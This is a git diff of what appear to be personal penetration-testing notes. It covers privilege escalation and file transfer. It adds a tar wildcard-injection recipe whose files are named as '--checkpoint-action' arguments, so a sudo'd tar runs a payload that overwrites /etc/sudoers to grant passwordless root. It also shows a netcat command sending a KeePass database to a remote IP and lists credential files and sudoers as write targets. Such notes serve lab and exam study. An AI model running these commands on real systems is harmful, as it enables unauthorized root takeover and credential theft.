@@ -124,6 +124,7 @@ Transfer files from window using nc
 ```
 Get-Content "Database.kdbx" | .\nc.exe 192.168.45.239 5555
 nc -lnvp 5555 > Database.kdbx
+keepassxc 
 ```
 
 # 🔹Initial Access
@@ -145,6 +146,7 @@ Public exploits-> Sometimes, you need to change the payload (or put some pentest
 ```
 
 # 🔹Linux Privilege Escalation
+
 ```
 Sudo -l -> gcore -> check running processes for any Password dumping related processes
 ```
@@ -156,13 +158,29 @@ Is any of the local binary vulnerable? Sudo vulnerable?
 ```
 wp-config.php -> contains credentials
 ```
+
 ```
 If we have root file write, check if we can write to 
 - /root/.ssh/authorized_keys
 - /etc/passwd
 - /etc/sudoers
 ```
-keepassxc 
-```
 
 ```
+sudo -l -> tar -czvf /tmp/backup.tar.gz*
+
+#at target machine, create 2 files
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=sh payload.sh'
+#then create a payload.sh with below content, you can create on your kali machine and transfer to target machine.
+#  payload.sh = echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+chmod +x payload.sh
+#execute the tar
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
+```
+
+
+
+
+
